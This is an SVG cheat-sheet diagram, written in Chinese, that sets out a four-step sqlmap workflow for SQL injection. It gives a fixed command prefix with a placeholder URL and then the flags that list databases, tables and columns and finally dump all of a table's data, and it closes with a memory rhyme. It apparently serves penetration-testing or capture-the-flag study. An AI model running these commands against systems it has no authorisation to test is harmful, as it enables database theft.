<svg viewBox="0 0 680 340" width="680" xmlns="http://www.w3.org/2000/svg">
<title>sqlmap 四步下钻模板</title>
<desc>一行固定前缀加四个下钻动作：列库、列表、列表列、拖数据</desc>
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
</defs>
<rect x="0" y="0" width="680" height="340" fill="#1e1e2e"/>
<g>
<rect x="40" y="40" width="600" height="64" rx="12" fill="#085041" stroke="#5DCAA5" stroke-width="0.5"/>
<text x="340" y="60" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="13" font-weight="500" fill="#9FE1CB">固定前缀 —— 这行永远不变</text>
<text x="340" y="84" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="12" fill="#E1F5EE">python sqlmap.py -u "URL" --batch --technique=BE</text>
</g>
<path d="M340 104 L340 140" stroke="#5F5E5A" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
<g>
<rect x="40" y="150" width="130" height="100" rx="8" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="105" y="174" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="14" fill="#B5D4F4">--dbs</text>
<text x="105" y="200" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="12" fill="#85B7EB">无参数</text>
<text x="105" y="224" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#B5D4F4">列出所有库</text>
</g>
<path d="M170 200 L186 200" stroke="#5F5E5A" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
<g>
<rect x="186" y="150" width="130" height="100" rx="8" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="251" y="174" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="14" fill="#B5D4F4">--tables</text>
<text x="251" y="200" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="12" fill="#85B7EB">-D 库名</text>
<text x="251" y="224" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#B5D4F4">列出表</text>
</g>
<path d="M316 200 L332 200" stroke="#5F5E5A" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
<g>
<rect x="332" y="150" width="130" height="100" rx="8" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="397" y="174" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="14" fill="#B5D4F4">--columns</text>
<text x="397" y="200" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="12" fill="#85B7EB">-T 表名</text>
<text x="397" y="224" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#B5D4F4">列出列</text>
</g>
<path d="M462 200 L478 200" stroke="#5F5E5A" stroke-width="1.5" fill="none" marker-end="url(#arrow)"/>
<g>
<rect x="478" y="150" width="130" height="100" rx="8" fill="#0C447C" stroke="#85B7EB" stroke-width="0.5"/>
<text x="543" y="174" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="14" fill="#B5D4F4">--dump</text>
<text x="543" y="200" text-anchor="middle" dominant-baseline="central" font-family="monospace" font-size="12" fill="#85B7EB">-T 表名</text>
<text x="543" y="224" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#B5D4F4">拖出全部数据</text>
</g>
<g>
<rect x="40" y="276" width="600" height="44" rx="10" fill="#633806" stroke="#FAC775" stroke-width="0.5"/>
<text x="340" y="298" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="13" font-weight="500" fill="#FAEEDA">记忆口诀：库 → 表 → 列 → 数据，一步一步往下钻</text>
</g>
</svg>
